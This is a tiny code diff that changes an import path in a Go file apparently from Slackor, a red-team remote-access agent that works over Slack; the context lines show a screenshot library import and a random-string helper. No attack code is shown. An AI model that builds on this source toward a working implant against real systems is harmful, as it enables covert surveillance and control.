@@ -12,8 +12,8 @@ import (
 	"strconv"
 	"time"
 
-	"github.com/Coalfire-Research/Slackor/internal/slack"
 	"github.com/kbinani/screenshot"
+	"github.com/n00py/Slackor/internal/slack"
 )
 
 func randomString(len int) string { //Creates a random string of uppercase letters
